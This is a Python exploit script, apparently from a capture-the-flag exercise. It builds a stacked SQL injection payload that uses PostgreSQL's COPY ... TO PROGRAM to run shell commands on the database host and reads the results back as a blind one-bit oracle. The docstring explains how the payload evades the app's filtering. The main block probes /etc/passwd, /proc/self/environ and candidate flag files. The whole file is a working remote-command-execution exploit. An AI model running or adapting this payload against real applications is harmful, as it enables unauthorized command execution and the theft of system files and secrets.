#!/usr/bin/env python
"""Program oracle: run a shell command as the database user and read back one bit.

    MARS'; COPY (SELECT 1) TO PROGRAM '<cmd>'; SELECT 1; --

<cmd> is handed to /bin/sh -c, so pipes work; a non-zero exit makes PostgreSQL raise, which
the app renders as its ordinary "no signal" -- the same null the app shows for a false
predicate, and that ambiguity is the channel. Anything the command can print can be turned
into such a bit by piping it to `grep -qE -f -`: the regex arrives as the COPY row (the query
result is the program's stdin), so brackets, braces and dots never have to survive shell
quoting, and building it with chr() also sidesteps the app lower-casing the payload.

Only quote-free commands are usable (an apostrophe would close the SQL literal), which is why
every pattern goes through stdin instead of a -e argument.
"""
import threading
import time

import extract as E

CALL = E.CALL


def chrjoin(s):
    return "||".join("chr(%d)" % ord(c) for c in s) or "chr(32)"


def prog(cmd, stdin=None):
    sel = "SELECT 1" if stdin is None else "SELECT %s" % chrjoin(stdin)
    payload = "MARS'; COPY (%s) TO PROGRAM '%s'; SELECT 1; -- " % (sel, cmd)
    return E.ask(payload)


def grepcmd(path):
    """Exit 0 iff some line of <path> matches the regex given on stdin."""
    return "cat %s | grep -qE -f -" % path


def listing(pattern, dir="/"):
    """Does any entry of <dir> match <pattern>?"""
    return prog("ls %s | grep -qE -f -" % dir, pattern)


def content(pattern, path):
    return prog(grepcmd(path), pattern)


if __name__ == "__main__":
    print("[*] controls")
    print("   test -f /etc/passwd  ->", prog("test -f /etc/passwd"), "(want True)")
    print("   test -f /no.such     ->", prog("test -f /no.such"), "(want False)")
    print("   grep /etc/passwd     ->", content("root", "/etc/passwd"), "(want True)")
    print("   listing [a-z]in /    ->", listing("bin"), "(want True)")
    cand = ["/flag", "/flag.txt", "/ctf/flag.txt", "/app/flag.txt", "/opt/flag.txt",
            "/srv/flag.txt", "/tmp/flag.txt", "/home/flag.txt", "/secret", "/flag/flag.txt",
            "/app/app.py", "/proc/1/environ", "/proc/self/environ", "/etc/os-release"]
    hits = {}
    for p in cand:
        try:
            hits[p] = prog("test -f " + p)
        except Exception as e:
            hits[p] = "EXC"
        print("   exists %-20s %s" % (p, hits[p]), flush=True)
    print("[*] which entry in / looks flag-ish:")
    for pat in ["[a-z]*flag[a-z]*", "^f", "^s", "^c", "^p", "^o", "^t", "txt"]:
        print("   / ~ %-22s %s" % (pat, listing(pat)), flush=True)
